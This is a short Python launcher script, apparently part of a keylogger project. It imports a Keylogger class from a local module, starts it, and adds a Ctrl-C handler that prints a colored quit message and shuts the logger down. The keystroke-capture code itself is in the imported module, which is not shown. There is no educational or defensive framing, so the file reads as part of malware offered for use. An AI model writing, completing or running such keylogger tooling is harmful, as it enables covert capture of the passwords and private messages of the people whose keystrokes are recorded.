#!/usr/bin/env python3

import signal
import sys

from termcolor import colored
from keylogger import Keylogger

keylogger = None

def def_handler(sig, frame):
    global keylogger 
    print(colored("\n[!] Quiting the program...\n", "red"))
    keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def main():
    global keylogger

    keylogger = Keylogger()
    keylogger.start()

if __name__ == "__main__":
    main()
